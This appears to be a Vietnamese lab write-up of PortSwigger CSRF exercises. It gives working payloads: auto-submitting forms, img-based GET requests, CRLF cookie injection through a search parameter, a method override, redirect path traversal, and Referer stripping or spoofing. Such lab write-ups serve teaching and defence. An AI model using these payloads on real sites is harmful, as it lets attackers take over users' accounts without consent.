---
title: ' Web08: Cross-site request forgery (CSRF)'
tags: [web8]

---

# **1. Lab: CSRF vulnerability with no defenses**
> Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF.
Để giải quyết bài lab, hãy tạo một số HTML sử dụng tấn công CSRF để thay đổi địa chỉ email của người xem và tải nó lên máy chủ khai thác của bạn. Cho sẵn 1 người dùng hợp lệ `wiener:peter`
![image](https://hackmd.io/_uploads/r1Fa_tF7R.png)

>Đăng nhập trang web thì có chức năng thay đổi email, thử thay đổi 1 email hợp lệ: ![image](https://hackmd.io/_uploads/rk1GFFYXA.png)

>Xem request thì thấy có `POST /my-account/change-email` được gửi lên, chỉ chứa tham số `email`, mà không hề có 1 cơ chế bảo vệ chống CSRF nào: ![image](https://hackmd.io/_uploads/Sk-KnFK70.png). 
>
>Chức năng thay đổi email sử dụng phương thức **POST** và không có bất kỳ cơ chế nào ngăn chặn tấn công CSRF. Quan sát request này nhận thấy quá trình thay đổi email của chức năng xác định duy nhất qua tham số **`email`** truyền bằng phương thức POST (giá trị **`session`** trong cookie có sẵn trong browser nạn nhân). Ta cần tìm cách khiến nạn nhân cũng thực hiện request **POST** này với giá trị tham số email được đặt trước.


>Ta tạo một trang web giả mạo để gửi nạn nhân với nội dung sau:
```
<html>
  <body>
    <form action="https://<LAB-DOMAIN>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="ducanh&#64;gmail&#46;com" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```

>Cụ thể khi nạn nhân truy cập trang web này, nó tự động submit form update email đến đường dẫn `https://<LAB-DOMAIN>/my-account/change-email` với trường `email` do attacker định sẵn. Khi đó email tài khoản nạn nhân sẽ bị thay đổi.

>Gửi payload trên vào exploit server: ![image](https://hackmd.io/_uploads/H1uuTYtQC.png)

>Thử **View exploit** và thấy email của tài khoản hiện tại đã bị thay đổi:
>![image](https://hackmd.io/_uploads/SkEjTFYmA.png)

>Bây giờ chỉ việc **Deliver exploit to victim** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/BJEbAYYXR.png)

# **2. Lab: CSRF where token validation depends on request method**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó cố gắng chặn các cuộc tấn công CSRF nhưng chỉ áp dụng biện pháp phòng vệ cho một số loại yêu cầu nhất định.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/rkDLIqKm0.png)

>Lần này, khi đổi email thì có thêm cơ chế bảo vệ CSRF token để tránh bị giả mạo yêu cầu: ![image](https://hackmd.io/_uploads/Bk3Bw9Km0.png)

>Khi ta cố tình sửa đổi hoặc xóa token này thì server sẽ reject yêu cầu: ![image](https://hackmd.io/_uploads/H1Ecv5FXA.png)
![image](https://hackmd.io/_uploads/SkNoD5YX0.png)

>Tuy nhiên, khi thay đổi method của request từ POST thành GET và xóa CSRF token đi, ta lại thay đổi thành công email: ![image](https://hackmd.io/_uploads/Hyqn_cKm0.png)
![image](https://hackmd.io/_uploads/r1tp_5KXR.png)

>Như vậy, server đã chỉ validate CSRF token ở phương thức POST mà bỏ quên GET. Ta có thể tận dụng thẻ `<img>` trong HTML, có phương thức GET để truy vấn dữ liệu từ server. Bây giờ ta chỉ cần tạo payload sau: `<img src="https://<LAB-DOMAIN>/my-account/change-email?email=hacked%40csrf.com">` và gửi vào exploit-server. Khi nạn nhân load trang exploit này, ảnh `<img>` trên sẽ được load với source chính là GET request để update email: ![image](https://hackmd.io/_uploads/Bkf9tcF7R.png)

>Chọn `Deliver exploit to victim` và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/BkkAFcYQA.png)

# **3. Lab: CSRF where token validation depends on token being present**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/SJU9o9YQ0.png)

>Tương tự như các bài trước, thực hiện bắt request khi update email thì thấy có thêm CSRF token được gửi kèm: ![image](https://hackmd.io/_uploads/r1FG29FmA.png)

>Nếu ta sửa đổi token này thì sẽ có respone thông báo **"Invalid CSRF token"**:![image](https://hackmd.io/_uploads/SJiv39FXA.png)

>Nếu để trống trường này thì **"Missing parameter 'csrf'"** :
>![image](https://hackmd.io/_uploads/Bk75ncF7A.png)

>Nhưng nếu ta xóa bỏ hẳn CSRF token khỏi request thì request lại được xử lí thành công: ![image](https://hackmd.io/_uploads/ryk16ctm0.png)
![image](https://hackmd.io/_uploads/BJJgp9KXA.png)

>Như vậy, dẫn tới việc hacker có thể thay đổi email nạn nhân mà không cần CSRF hợp lệ nào trong request gửi đi. 

>Tạo một trang web giả mạo bằng **Generate CSRF Poc** để gửi nạn nhân với nội dung sau:
>![image](https://hackmd.io/_uploads/H1UgyiFm0.png)

>Payload:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://<LAB-DOMAIN>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

>Cụ thể khi nạn nhân truy cập trang web này, nó tự động submit form update email đến đường dẫn `https://<LAB-DOMAIN>/my-account/change-email` với trường `email` do attacker định sẵn. Khi đó email tài khoản nạn nhân sẽ bị thay đổi: ![image](https://hackmd.io/_uploads/BJrPJotmC.png)


>**Deliver exploit to victim** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/HJeRCcY7C.png)

# **4. Lab: CSRF where token is not tied to user session**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó sử dụng CSRF Token để cố gắng ngăn chặn các cuộc tấn công CSRF nhưng chúng không được tích hợp vào hệ thống xử lý phiên của trang web.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có hai tài khoản trên ứng dụng mà bạn có thể sử dụng để giúp thiết kế cuộc tấn công của mình. Thông tin xác thực như sau: `wiener:peter` và `carlos:montoya`
![image](https://hackmd.io/_uploads/H1f2TGuBC.png)

>Ứng dụng web này vẫn bị dính CSRF mặc dù có trang bị CSRF token nhưng token này không được lưu vào session của user → CSRF token của user này vẫn có thể dùng cho người khác.

>Cụ thể, khi đăng nhập tài khoản `carlos:montoya`, ta thu thập CSRF token tại form update email: ![image](https://hackmd.io/_uploads/rkyd7st7R.png)

>Đăng nhập sang `wiener:peter`, sử dụng CSRF token vừa trên để update email thì thành công → token này không được lưu vào session của từng user: ![image](https://hackmd.io/_uploads/B1gJNjt7R.png)

>Tận dụng điều đó, ta sẽ tạo payload với CSRF token (chưa từng được sử dụng) được lấy ở tài khoản đang có: ![image](https://hackmd.io/_uploads/Sy5LVsKX0.png)

>Payload sẽ là 1 form update email với 2 trường email và csrf, trong đó csrf sẽ là giá trị CSRF token vừa lấy được ở bước trên:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5100fb04df23e1810908c200bb0030.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked123&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="5o6sadjmyHTsIAWaYOu9rEP6WIs9R0Si" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
![image](https://hackmd.io/_uploads/Sku1SjYXR.png)

>**Deliver exploit to victim** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/H1wZSiKm0.png)

# **5. Lab: CSRF where token is tied to non-session cookie**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó sử dụng CSRF Token để cố gắng ngăn chặn các cuộc tấn công CSRF nhưng chúng không được tích hợp hoàn toàn vào hệ thống xử lý phiên của trang web.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có hai tài khoản trên ứng dụng mà bạn có thể sử dụng để giúp thiết kế cuộc tấn công của mình. Thông tin xác thực như sau: `wiener:peter` và `carlos:montoya`
![image](https://hackmd.io/_uploads/r1NiHiKX0.png)

>Thực hiện đăng nhập với user `wiener` và update email. Có thể thấy, ứng dụng web sử dụng một cookie `csrfKey` khác session để liên kết với `csrf` token. 
>![image](https://hackmd.io/_uploads/HJaHy7_SR.png)

>Nếu thay đổi `crsfKey`, server sẽ báo `Invalid CSRF token`.
>![image](https://hackmd.io/_uploads/ByD21mdBA.png)

>Lúc này, đăng nhập vào `carlos`, rồi vẫn dùng cặp `<csrfKey, csrf>` cũ của `peter`, thay giá trị của session tương ứng với `carlos` và Send, thì server vẫn phản hồi thành công và đổi email thành `ducanh123@gmail.com`: 
>![image](https://hackmd.io/_uploads/Syvpx7uS0.png)
>![image](https://hackmd.io/_uploads/ByckZXOHC.png)

>Như vậy, csrf token không được liên kết vào session của từng user mà chỉ dựa vào `csrfKey`. Mục tiêu bây giờ của mình là làm sao thay đổi được `csrfKey` của nạn nhân.

>Ngoài ra, trong trang chủ còn có chức năng tìm kiếm: ![image](https://hackmd.io/_uploads/BySWz7dSC.png)

>Thử gõ "abc" và tìm kiếm: ![image](https://hackmd.io/_uploads/HkgQM7uSC.png)

>Xem lại respone trả về,thấy chuỗi được search sẽ lưu vào cookie có tên `LastSearchTerm`:
>![image](https://hackmd.io/_uploads/Hy_rzm_SR.png)

>Dựa vào đó, ta sẽ search với payload sau để chèn `csrfKey` cookie vào trong **SetCookie**:

```
abc;+csrfKey=5haog3i8cE7shcnibSuHfiBinpaqRs8t
```

>Thực hiện encode payload trên và search &rarr; ta đã set cookie `csrfKey` thành công theo ý muốn (ở đây là `csrfKey` của user `wiener` ở trên)
![image](https://hackmd.io/_uploads/HkUGHQ_rA.png)

>Bây giờ ta chỉ việc tạo form để thực hiện 2 bước:
>- Inject `csrfKey` cookie: Sử dụng tag `<img>`
>- Form update email với `csrf` là giá trị `csrf` của user `wiener` ở trên.

```htmlembedded
<html>
  <body>
      <img src="https://<LAB-DOMAIN>/?search=abc%0d%0aSet-Cookie%3a%20csrfKey=5haog3i8cE7shcnibSuHfiBinpaqRs8t" onerror= 'document.forms[0].submit();'>
      <form action="https://<LAB-DOMAIN>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;csrf&#46;com" />
        <input type="hidden" name="csrf" value="mHsLiCDnWeDQAJ3VzmGysNUnz7ptTrkd" />
    </form>
  </body>
</html>
```

>Lưu payload vào exploit server: ![image](https://hackmd.io/_uploads/SywqL7uH0.png)

>Chạy payload "View exploit" thì thấy thay đổi email thành công: ![image](https://hackmd.io/_uploads/Sk9O87OBR.png)

>Tuy nhiên khi `Deliver exploit to victim` thì không thành công. Lí do là ta cần set thêm cookie `SameSite=None` vì site của exploit-server khác với trang web của bài lab: 
>![image](https://hackmd.io/_uploads/ByOzvmOBA.png)

>Thử lại và thấy thành công, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJdidmOrA.png)

# **6. Lab: CSRF where token is duplicated in cookie**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó cố gắng sử dụng kỹ thuật ngăn chặn CSRF "duplicated" không an toàn.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`: 
![image](https://hackmd.io/_uploads/BJCGaXOSR.png)

>Đăng nhập vào `wiener`, có chức năng Update email, thực hiện thay đổi email. Tiến hành xem request gửi đi, thấy rằng lần này `csrf` được gán vào trong cả Cookie: ![image](https://hackmd.io/_uploads/SkTrRQdrR.png)

>Thử thay đổi cả csrf trên cookie và ở phần body thành "123" và Send, thấy rằng request vẫn được xử lí thành công: ![image](https://hackmd.io/_uploads/ryHi0QOS0.png)

>Thử thay đổi để 2 csrf này khác nhau thì báo lỗi **"Invalid CSRF token"**: ![image](https://hackmd.io/_uploads/ryM0R7dSR.png)

>Chứng tỏ rằng, server sẽ check giá trị của 2 tham số này nếu giống nhau thì sẽ tiến hành thực hiện request!

>Nhiệm vụ của mình bây giờ sẽ là inject `csrf` bất kì trên cookie của nạn nhân rồi thực hiện sử dụng chính `csrf` token để tấn công. 

>Tương tự bài trên, sử dụng chức năng search để thực hiện inject `csrf` cookie.

>Ta thực hiện search payload (sau khi encode) sau để inject `csrf` cookie.

```
abc\r\n    
Set-Cookie: csrf=ducanh; SameSite=None
```

>![image](https://hackmd.io/_uploads/BkBxX4uH0.png)

>Ta tạo được CSRF payload hoàn chỉnh như sau:
>- Inject `csrf` cookie: Sử dụng tag `<img>`
>- Form update email với `csrf` là giá trị `csrf` giống cookie `csrf`.

```htmlembedded
<html>
  <body>
      <img src="https://<LAB-DOMAIN>/?search=abc%0d%0aSet-Cookie:%20csrf=ducanh%3b%20SameSite%3dNone" onerror="document.forms[0].submit();">
      <form action="https://<LAB-DOMAIN>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;csrf&#46;com" />
        <input type="hidden" name="csrf" value="ducanh" />
    </form>
  </body>
</html>
```

>Lưu payload vào trong exploit server: ![image](https://hackmd.io/_uploads/rJHKEEOHA.png)

> Chọn **"Deliver exploit to victim"**, thấy rằng email đã được thay đổi!
Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/B1UAEE_HR.png)

# **7. Lab: SameSite Lax bypass via method override**
>Chức năng email thay đổi của lab này dễ bị tấn công bởi CSRF. Để giải quyết vấn đề, hãy thực hiện một cuộc tấn công CSRF làm thay đổi địa chỉ email của nạn nhân. Bạn nên sử dụng máy chủ khai thác được cung cấp để lưu trữ cuộc tấn công của mình.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/rkPADBOB0.png)

>Đăng nhập vào `wiener` và tiến hành đổi email, thấy rằng session cookie được set mà không được set `SameSite` => mặc định ở Chrome nó tự động set là `SameSite=Lax`:
>![image](https://hackmd.io/_uploads/SylBdtHuBC.png)

>Thực hiện các bước test CSRF như các lab trước: ![image](https://hackmd.io/_uploads/BJk9qSOHC.png)

>Kết quả fail do `SameSite=Lax` chỉ cho phép GET request đối với cross-site request: ![image](https://hackmd.io/_uploads/SygpordHR.png)

>Thử update email với phương thức GET cũng không thành công: ![image](https://hackmd.io/_uploads/ryDGhruS0.png)

>Tuy nhiên, ta có thể override method bằng cách thêm tham số `_method=POST`vào trong GET để update email thành công: ![image](https://hackmd.io/_uploads/SyRx6BuSA.png)

>Như vậy, ta cần tạo payload như sau và lưu vào trong exploit server: 
```
<script>
  document.location="https://0afb00ba04f4415b80f08fe500470061.web-security-academy.net/my-account/change-email?email=hacked%40gmail.com&_method=POST"
</script>
```
![image](https://hackmd.io/_uploads/BJDt6SOHA.png)

>Chọn "Deliver exploit to victim" và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Sy5h6SuBA.png)

# **8. Lab: SameSite Strict bypass via client-side redirect**
> Chức năng email thay đổi của lab này dễ bị tấn công bởi CSRF. Để giải quyết vấn đề, hãy thực hiện một cuộc tấn công CSRF làm thay đổi địa chỉ email của nạn nhân. Bạn nên sử dụng máy chủ khai thác được cung cấp để lưu trữ cuộc tấn công của mình.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/HytRS2CBA.png)

>Đăng nhập vào `wiener`, ta thấy được Cookie được set thêm `SameSite=Strict`
>![image](https://hackmd.io/_uploads/HJe9fInCH0.png)

>Thực hiện đổi mail hợp lệ: ![image](https://hackmd.io/_uploads/Byr38hABC.png)

>Khi chuyển request change email từ POST sang GET ta thấy vẫn đang thực hiện thành công:![image](https://hackmd.io/_uploads/SJDJwnAHR.png)

>Tạo payload với phương thức GET: ![image](https://hackmd.io/_uploads/B1Wg_3ArA.png)

>Cho payload vào exploit server thì và **"View exploit"** thì trang web đã chuyển hướng ta về trang **/login**: ![image](https://hackmd.io/_uploads/rJcN_nCHC.png)

>Lí do là `SameSite=Strict` đã chặn hành động đổi email, do site của 2 trang web là khác nhau. Chúng ta phải đi tìm cách bypass. Ở chức năng comment bài post, ứng dụng tự động redirect về trang bài post sau 3s sau khi comment thành công: ![image](https://hackmd.io/_uploads/BkNLKn0BR.png)

>Cụ thể, ở bước confirm comment tại `/post/comment/confirmation?postId=X`, tồn tại 1 đoạn script `commentConfirmationRedirect.js` có chức năng redirect trên: ![image](https://hackmd.io/_uploads/r1T3F2RBR.png)

> Đọc source code có thể thấy, trang thực hiện redirect về trang `<LAB-DOMAIN>/post/<postId>`, trong đó `postId` được lấy từ tham số phương thức GET: ![image](https://hackmd.io/_uploads/S1nZ920rR.png)

>Ví dụ như đối với `postId=4` thì sau 3s trang sẽ redirect về `<LAB-DOMAIN>/post/<postId>`: ![image](https://hackmd.io/_uploads/rySNch0SR.png)

>Thử gán `postId` bằng chuỗi bất kì thì thấy nó vẫn redirect bình thường:
>![image](https://hackmd.io/_uploads/HJOkj3Rr0.png)
>![image](https://hackmd.io/_uploads/r17_5nRSA.png)

>Do `postId` được lấy trực tiếp từ user và không có cơ chế validate &rarr; ta có thể nghĩ đến Path Traversal. Thử `postId=../../my-account` thì thấy trang `/my-account` được load thành công: ![image](https://hackmd.io/_uploads/rkSDj2AHR.png)

>Dựa vào những phân tích ở trên, ta sẽ kết hợp Path Traversal ở postId để redirect về đường dẫn update email dưới phương thức GET. Payload cụ thể như sau:
>`/post/comment/confirmation?postId=../../my-account/change-email%3femail=ducanh123%40csrf.com%26submit=1`
![image](https://hackmd.io/_uploads/BJSr22CSC.png)

>Kết quả ta thấy đã thay đổi thành công email &rarr; Cookie session đã được kèm theo vào request thứ 2 vì redirect từ samesite:
>![image](https://hackmd.io/_uploads/r1Kkkp0rR.png)
![image](https://hackmd.io/_uploads/ry2xyTCHA.png)
![image](https://hackmd.io/_uploads/S1LbyTCHR.png)

>Tạo payload bằng PoC của Burp: ![image](https://hackmd.io/_uploads/Bkvw1aRBR.png)

> Lưu vào exploit server: ![image](https://hackmd.io/_uploads/ry0qJpABR.png)

>Chọn "Deliver exploit to victim", chờ khoảng 1 phút thì thấy email đã thay đổi thành công!, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ryVilpCrC.png)

# **9. Lab: SameSite Strict bypass via sibling domain**
>Tính năng trò chuyện trực tiếp của lab này dễ bị tấn công bởi việc chiếm quyền điều khiển WebSocket trên nhiều trang web (CSWSH). Để giải quyết lab, hãy đăng nhập vào tài khoản của nạn nhân.
Để thực hiện việc này, hãy sử dụng máy chủ khai thác được cung cấp để thực hiện cuộc tấn công CSWSH nhằm lấy lịch sử trò chuyện của nạn nhân sang máy chủ Burp Collaborator mặc định. Lịch sử trò chuyện chứa thông tin đăng nhập ở dạng văn bản thuần túy.
Nếu bạn chưa làm như vậy, chúng tôi khuyên bạn nên hoàn thành chủ đề của mình về các lỗ hổng WebSocket trước khi thử thực hành trong phòng thí nghiệm này.
![image](https://hackmd.io/_uploads/SyfBG6CrC.png)

# **10. Lab: SameSite Lax bypass via cookie refresh**
![image](https://hackmd.io/_uploads/By7Pzp0SC.png)

# **11. Lab: CSRF where Referer validation depends on header being present**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó cố gắng chặn các yêu cầu tên miền chéo nhưng có một phương án dự phòng không an toàn.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`
![image](https://hackmd.io/_uploads/ByT0mp0SA.png)

>Ứng dụng web này trang bị cơ chế chống CSRF bằng cách validate trường Referer. Đăng nhập vào `wiener` và thực hiện thay đổi email hợp lệ: ![image](https://hackmd.io/_uploads/rypu4pCS0.png)

>Nếu ta thay đổi `Referer` khác domain của ứng dụng web thì server sẽ trả về `Invalid referer header`:
>![image](https://hackmd.io/_uploads/ry-oN60HA.png)

>Tuy nhiên nếu ta  xóa header Referer luôn thì server vẫn xử lí và trả về kết quả thành công: ![image](https://hackmd.io/_uploads/HJZlB6Ar0.png)

>Điều này suy ra được rằng server chỉ validate Referer khi nó tồn tại, còn không thì bỏ qua. Như vậy chỉ cần tạo CSRF payload thông thường và thêm `<meta name="referrer" content="never">` để loại trừ `Referer` khỏi request.

>Tạo payload bằng PoC: ![image](https://hackmd.io/_uploads/ryH8BaRB0.png)

>Thêm `<meta name="referrer" content="never">` vào đầu payload và lưu vào trong exploit server: ![image](https://hackmd.io/_uploads/rkUOS6CH0.png)

```
<html>
  <meta name="referrer" content="never">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ae300220400dffd80458a6c009e00a7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="ducanh123&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

>Chọn **"Deliver exploit to victim"** thì thấy email đã thay đổi thành công!, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ByckUT0BA.png)

# **12. Lab: CSRF with broken Referer validation**
>Chức năng thay đổi email của lab này dễ bị tấn công bởi CSRF. Nó cố gắng phát hiện và chặn các yêu cầu tên miền chéo, nhưng cơ chế phát hiện có thể bị bỏ qua.
Để giải quyết bài lab, hãy sử dụng máy chủ khai thác của bạn để lưu trữ trang HTML sử dụng cuộc tấn công CSRF để thay đổi địa chỉ email của người xem.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

>![image](https://hackmd.io/_uploads/BJ2f8TRrA.png)

>Ứng dụng web này trang bị cơ chế chống CSRF bằng cách validate trường Referer. 
Đăng nhập với tài khoản cho sẵn và thực hiện update email: ![image](https://hackmd.io/_uploads/S10sdpASR.png)

>Khi thay đổi giá trị của header Referer thành domain khác thì server trả về lỗi ""Invalid referer header"": ![image](https://hackmd.io/_uploads/rJnhYa0SC.png)

>Khi xóa header này và Send request thì server không xử lí như lab trước nữa: ![image](https://hackmd.io/_uploads/BJdl9TCBR.png)

>Tuy nhiên khi POST request trên với trường Referer có chứa domain của ứng dụng như 2 cách sau thì request được xử lí thành công:

>- Domain web là subdomain: ![image](https://hackmd.io/_uploads/H1S8c6RBA.png)

>- Domain web là 1 query string hay là tham số: ![image](https://hackmd.io/_uploads/r1OeoaAHC.png)

>Như vậy, server chỉ thực hiện validate Referer có chứa chung domain với ứng dụng web không hay thôi. Ta chỉ việc set Referer chứa domain của ứng dụng khi thực hiện CSRF.

>Thực hiện vào exploit-server, chỉnh URL exploit có chứa domain của ứng dụng theo cách query string. Đồng thời payload CSRF tương tự bài lab 1: ![image](https://hackmd.io/_uploads/BJB3sT0SA.png)

>Tuy nhiên, khi thử `View exploit` thì vẫn bị báo `Invalid referer header`. Check request thì có thể thấy phần param chứa domain của web không được mang theo request ở header Referer: ![image](https://hackmd.io/_uploads/r1Fg260rC.png)

>Để có thể chứa domain trong Referer khi thực thi payload, ta cần thêm header `Referrer-Policy: unsafe-url`: ![image](https://hackmd.io/_uploads/SJSrnpRS0.png)

>Tuy nhiên đến bước `Deliver exploit to victim` thì vẫn không thành công. Có vẻ như domain web không được kèm theo trong Referer như mong muốn. Sử dụng cách thay thế như sau:
>`history.pushState("", "", "/<LAB-DOMAIN>")`
>Thêm đoạn script trên vào và send exploit đến nạn nhân: ![image](https://hackmd.io/_uploads/Byp7y0RBA.png)

>Chọn **"Deliver exploit to victim"** thì thấy email đã thay đổi thành công: 
>![image](https://hackmd.io/_uploads/HkOZe0CrA.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rywR7kyUC.png)
